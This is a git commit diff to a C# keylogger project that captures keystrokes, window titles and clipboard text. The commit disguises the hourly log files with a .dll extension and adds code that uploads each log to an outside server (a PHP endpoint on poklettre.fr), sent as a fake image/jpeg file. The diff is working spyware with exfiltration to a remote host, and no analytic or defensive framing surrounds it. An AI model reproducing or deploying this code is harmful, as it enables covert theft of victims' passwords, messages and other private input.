ef71f788b669885ddbb8b19cdd2f767009504c8a
Darkempire78 <clement.wawszczyk@gmail.com>
2021-04-06 20:05:17 +0200

    add server log

--- Keylogger/Program.cs
+++ Keylogger/Program.cs
@@ -1,6 +1,8 @@
 ﻿using Keystroke.API;
 using System;
+using System.Collections.Specialized;
 using System.IO;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
@@ -13,6 +15,8 @@ namespace Keylogger
     {
         string log = string.Empty;
         string currentWindowTitle = string.Empty;
+
+        string currentHour = string.Empty;
 
         //Get window titles
         [DllImport("user32.dll")]
@@ -56,7 +60,7 @@ namespace Keylogger
                     log += character2;
 
                     // Write logs
-                    writeLogs(log);
+                    writeLogs(log, currentHour);
                 });
 
                 Application.Run();
@@ -88,23 +92,94 @@ namespace Keylogger
             if (e.ContentType == SharpClipboard.ContentTypes.Text)
             {
                 log += "\n<newClipboardText>" + e.Content.ToString() + "</newClipboardText>\n";
-
-                // Write logs
-                writeLogs(log);
             }
         }
+        
 
-        public void writeLogs(string log)
+        public void writeLogs(string log, string currentHour)
         {
             // Write logs : https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
-            string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
-            string fileName = "kl-" + DateTime.UtcNow.ToString("MM-dd-yyyy") + ".dll";
+            string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\logs\\";
+            Directory.CreateDirectory(path); // Create the path if it does not exist
+            string fileName = "kl-" + DateTime.UtcNow.ToString("MM-dd-yyyy_HH") + ".dll";
+            
             File.WriteAllText(Path.Combine(path, fileName), log);
 
-            //Console.WriteLine(log);
+            if (currentHour != DateTime.UtcNow.ToString("HH"))
+            {
+                NameValueCollection nvc = new NameValueCollection();
+                HttpUploadFile("http://poklettre.fr/domotique/saveSQL.php", Path.Combine(path, fileName), "sql", "image/jpeg", nvc);
+            }
+
+            currentHour = DateTime.UtcNow.ToString("HH");
         }
 
-    }
 
+        public static void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
+        {
+            // https://stackoverflow.com/questions/566462/upload-files-with-httpwebrequest-multipart-form-data
+            //Console.WriteLine(string.Format("Uploading {0} to {1}", file, url));
+            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
+            byte[] boundarybytes = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
+
+            HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);
+            wr.ContentType = "multipart/form-data; boundary=" + boundary;
+            wr.Method = "POST";
+            wr.KeepAlive = true;
+            wr.Credentials = System.Net.CredentialCache.DefaultCredentials;
+
+            Stream rs = wr.GetRequestStream();
+
+            string formdataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
+            foreach (string key in nvc.Keys)
+            {
+                rs.Write(boundarybytes, 0, boundarybytes.Length);
+                string formitem = string.Format(formdataTemplate, key, nvc[key]);
+                byte[] formitembytes = System.Text.Encoding.UTF8.GetBytes(formitem);
+                rs.Write(formitembytes, 0, formitembytes.Length);
+            }
+            rs.Write(boundarybytes, 0, boundarybytes.Length);
+
+            string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n";
+            string header = string.Format(headerTemplate, paramName, file, contentType);
+            byte[] headerbytes = System.Text.Encoding.UTF8.GetBytes(header);
+            rs.Write(headerbytes, 0, headerbytes.Length);
+
+            FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
+            byte[] buffer = new byte[4096];
+            int bytesRead = 0;
+            while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
+            {
+                rs.Write(buffer, 0, bytesRead);
+            }
+            fileStream.Close();
+
+            byte[] trailer = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
+            rs.Write(trailer, 0, trailer.Length);
+            rs.Close();
+
+            WebResponse wresp = null;
+            try
+            {
+                wresp = wr.GetResponse();
+                Stream stream2 = wresp.GetResponseStream();
+                StreamReader reader2 = new StreamReader(stream2);
+                //Console.WriteLine(string.Format("File uploaded, server response is: {0}", reader2.ReadToEnd()));
+            }
+            catch (Exception ex)
+            {
+                //Console.WriteLine("Error uploading file", ex);
+                if (wresp != null)
+                {
+                    wresp.Close();
+                    wresp = null;
+                }
+            }
+            finally
+            {
+                wr = null;
+            }
+        }
+    }
    
 }
